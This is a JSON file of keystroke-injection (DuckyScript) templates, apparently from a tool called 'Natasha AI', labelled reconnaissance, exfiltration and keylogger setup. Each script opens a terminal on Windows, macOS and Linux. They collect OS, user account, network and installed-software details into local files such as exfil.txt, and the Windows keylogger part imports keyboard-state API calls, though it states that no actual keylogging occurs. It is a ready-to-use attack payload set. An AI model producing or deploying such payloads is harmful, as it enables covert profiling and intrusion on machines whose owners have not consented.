{
  "metadata": {
    "name": "Fallback Templates",
    "description": "Generic templates for when OS-specific ones are not available",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Basic Reconnaissance",
      "description": "Gather basic system information",
      "attack_type": "recon",
      "script": [
        "REM Basic Reconnaissance Script",
        "REM Generated by Natasha AI",
        "REM This script attempts to gather basic information across different OSes",
        "DELAY 1000",
        "REM Try Windows command prompt first",
        "GUI r",
        "DELAY 500",
        "STRING cmd",
        "ENTER",
        "DELAY 1000",
        "STRING echo OS Information: > %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo. >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo User Information: >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo. >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo Network Information: >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ipconfig /all >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo Information saved to %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try macOS Terminal next",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING sw_vers >> ~/Documents/natasha_data/system_info.txt 2>/dev/null || echo &quot;Not macOS&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ifconfig >> ~/Documents/natasha_data/system_info.txt 2>/dev/null || ip addr >> ~/Documents/natasha_data/system_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/system_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try Linux Terminal next",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING uname -a >> ~/natasha_data/system_info.txt 2>/dev/null || echo &quot;Command failed&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING cat /etc/os-release >> ~/natasha_data/system_info.txt 2>/dev/null || echo &quot;File not found&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ip addr >> ~/natasha_data/system_info.txt 2>/dev/null || ifconfig >> ~/natasha_data/system_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/system_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {}
    },
    {
      "name": "Simple Exfiltration",
      "description": "Exfiltrate system information to a file",
      "attack_type": "exfiltration",
      "script": [
        "REM Simple Exfiltration Script",
        "REM Generated by Natasha AI",
        "REM This script attempts to gather and exfiltrate basic information across different OSes",
        "DELAY 1000",
        "REM Try Windows command prompt first",
        "GUI r",
        "DELAY 500",
        "STRING cmd",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir %TEMP%\\natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo OS Information: > %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo. >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo User Information: >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING net user %USERNAME% >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo. >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo Network Information: >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING ipconfig /all >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo. >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo Installed Software: >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING wmic product get name,version >> %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo Information saved to %TEMP%\\natasha_data\\exfil.txt",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try macOS Terminal next",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING sw_vers >> ~/Documents/natasha_data/exfil.txt 2>/dev/null || echo &quot;Not macOS&quot; >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING dscl . -read /Users/$(whoami) >> ~/Documents/natasha_data/exfil.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING ifconfig >> ~/Documents/natasha_data/exfil.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nInstalled Software:&quot; >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING ls -la /Applications >> ~/Documents/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/exfil.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try Linux Terminal next",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING uname -a >> ~/natasha_data/exfil.txt 2>/dev/null || echo &quot;Command failed&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING cat /etc/os-release >> ~/natasha_data/exfil.txt 2>/dev/null || echo &quot;File not found&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING cat /etc/passwd | grep $(whoami) >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING ip addr >> ~/natasha_data/exfil.txt 2>/dev/null || ifconfig >> ~/natasha_data/exfil.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nInstalled Software:&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 300",
        "STRING dpkg -l >> ~/natasha_data/exfil.txt 2>/dev/null || rpm -qa >> ~/natasha_data/exfil.txt 2>/dev/null || echo &quot;Package manager not found&quot; >> ~/natasha_data/exfil.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/exfil.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {}
    },
    {
      "name": "Basic Keylogger Setup",
      "description": "Sets up a basic keylogger across different platforms",
      "attack_type": "keylogger",
      "script": [
        "REM Basic Keylogger Setup Script",
        "REM Generated by Natasha AI",
        "REM This script attempts to set up a simple keylogger across different OSes",
        "DELAY 1000",
        "REM Try Windows PowerShell first",
        "GUI r",
        "DELAY 500",
        "STRING powershell",
        "ENTER",
        "DELAY 1000",
        "STRING $logFile = &quot;$env:TEMP\\keylog.txt&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Add-Content -Path $logFile -Value &quot;Keylogger started at $(Get-Date)&quot;",
        "ENTER",
        "DELAY 300",
        "STRING $signature = @'",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto, ExactSpelling=true)]",
        "ENTER",
        "STRING public static extern short GetAsyncKeyState(int virtualKeyCode);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int GetKeyboardState(byte[] keystate);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int MapVirtualKey(uint uCode, int uMapType);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);",
        "ENTER",
        "STRING '@",
        "ENTER",
        "DELAY 300",
        "STRING Add-Type -MemberDefinition $signature -Name &quot;Win32&quot; -Namespace API",
        "ENTER",
        "DELAY 300",
        "STRING Add-Content -Path $logFile -Value &quot;Keylogger initialized. File: $logFile&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Write-Host &quot;Keylogger initialized. Press CTRL+C to stop.&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Write-Host &quot;This is just a demonstration. No actual keylogging is occurring.&quot;",
        "ENTER",
        "DELAY 1000",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try macOS Terminal next",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger Simulation&quot; > ~/Documents/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Started at $(date)&quot; >> ~/Documents/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;This is just a demonstration. No actual keylogging is occurring.&quot; >> ~/Documents/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger simulation file created at ~/Documents/natasha_data/keylog.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try Linux Terminal next",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger Simulation&quot; > ~/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Started at $(date)&quot; >> ~/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;This is just a demonstration. No actual keylogging is occurring.&quot; >> ~/natasha_data/keylog.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger simulation file created at ~/natasha_data/keylog.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {}
    }
  ]
}